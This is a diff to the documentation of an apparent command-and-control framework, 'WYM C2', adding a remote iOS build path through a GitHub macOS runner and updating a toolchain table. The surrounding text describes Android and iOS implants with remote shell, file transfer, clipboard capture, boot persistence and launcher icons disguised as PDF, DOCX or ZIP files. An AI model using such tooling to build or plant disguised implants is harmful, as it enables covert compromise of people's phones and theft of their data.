@@ -88,7 +88,11 @@ token and interval are baked in at build time; no runtime config needed.
   `clients/mobile/android`, package `com.wym.c2`). Foreground service + boot
   receiver keep it alive; `shell`, `download`, `upload`, `sleep`, `clipboard`,
   `exit` supported; the rest return "not supported on Android".
-- `ios` → `wym_ios.ipa` — macOS + Xcode only (`xcrun swiftc`, no xcodeproj).
+- `ios` → `wym_ios.ipa` — buildable on **any** OS via the MobAI ios-builder CLI
+  (see "Server-side build toolchains"): it snapshots the repo working tree,
+  compiles on a GitHub macOS runner and downloads the IPA to `./dist/`. The
+  template declares an XcodeGen manifest (`clients/mobile/ios/project.yml`); a
+  macOS server without the CLI still falls back to `xcrun swiftc`.
   `download`, `upload`, `sleep`, `clipboard`, `exit` supported.
 - Both accept a custom artifact name and a disguise launcher icon
   (PDF/DOCX/XLSX/PPTX/ZIP/RAR, or the WYM mark) — rendered server-side by
@@ -123,7 +127,13 @@ Detected at install time by `install.ps1` / `install.sh`:
 | .NET SDK  | `dotnet`             | `winget install Microsoft.DotNet.SDK.8` / `apt-get install dotnet-sdk-8.0` / `./dotnet-install.sh` |
 | Java      | `javac`              | Oracle JDK / `openjdk-17-jdk` / `brew install openjdk` |
 | Android   | `gradle` + `ANDROID_HOME`/`ANDROID_SDK_ROOT` | Android Studio / SDK cmdline-tools on **any** OS |
-| iOS       | `xcrun` + iphoneos SDK | Xcode (`xcode-select --install`) on **macOS** only |
+| iOS       | `builder` (MobAI ios-builder) `--ios-path clients/mobile/ios` | `tools/ios-builder-setup.{ps1,sh}` (install + `auth github` + `init`); macOS servers without it fall back to `xcrun` + iphoneos SDK |
+
+iOS IPA builds run **remotely**: `builder ios build` pushes the working tree as a
+snapshot, builds on a GitHub macOS runner (free on public repos, ~4-6 min for
+this template) and drops `dist/WymC2.ipa`. Run `tools/ios-builder-setup.sh` /
+`tools/ios-builder-setup.ps1` once on the server (GitHub token with `repo` +
+`workflow` scopes). The build is unsigned by default.
 
 Linux/macOS: bundled `dotnet-install.sh` installs to `~/.dotnet` without root
 and persists PATH; the server probes `~/.dotnet` directly.
